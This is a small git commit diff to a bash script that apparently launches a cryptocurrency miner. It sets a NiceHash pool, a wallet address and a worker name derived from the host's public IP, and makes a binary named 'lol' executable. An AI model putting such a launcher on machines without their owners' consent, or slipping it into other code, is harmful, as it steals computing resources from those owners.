52dfc7fc86a01c5dc4adc6478faad7abd8b935d8
darksleepaway <89434026+darksleepaway@users.noreply.github.com>
2021-08-24 09:42:08 +0700

    Update runing.sh

--- runing.sh
+++ runing.sh
@@ -1,7 +1,10 @@
 #!/bin/bash
+
 POOL=stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353
+
 WALLET=3K58rk4hAySW78RPaxkzFVhddAL7iMxkbZ
-WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )
+
+WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-BTCNICEHASH
 
 cd "$(dirname "$0")"
 chmod +x lol
